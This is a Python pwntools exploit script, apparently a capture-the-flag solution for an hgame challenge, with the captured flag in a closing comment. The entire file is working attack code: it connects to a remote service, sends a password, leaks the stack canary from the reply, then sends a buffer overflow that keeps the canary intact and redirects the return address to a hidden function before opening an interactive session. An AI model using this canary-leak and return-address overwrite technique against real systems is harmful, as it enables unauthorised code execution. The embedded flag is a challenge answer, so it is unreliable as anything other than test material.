#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']


p = remote('chuj.top', '50777')
# p = process('./a')
elf = ELF('./a')
# libc = ELF("./libpthread-2.31.so")
libc = ELF("./libc-2.31.so")

def debug():
    gdb.attach(p)
    pause()

p.recvuntil("enter your pass word\n")
payload = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
# debug()
p.send(payload)

canary = u64(p.recv(0x100)[24:24+8])
log.success('canary: ' + hex(canary))

door_addr = 0x401256
payload = b'a'*24 + p64(canary) + p64(0) + p64(door_addr)
p.sendline(payload)

p.interactive()
# hgame{GDb-15_My-Go00OOoOo0O00OoOd-fRienD!}
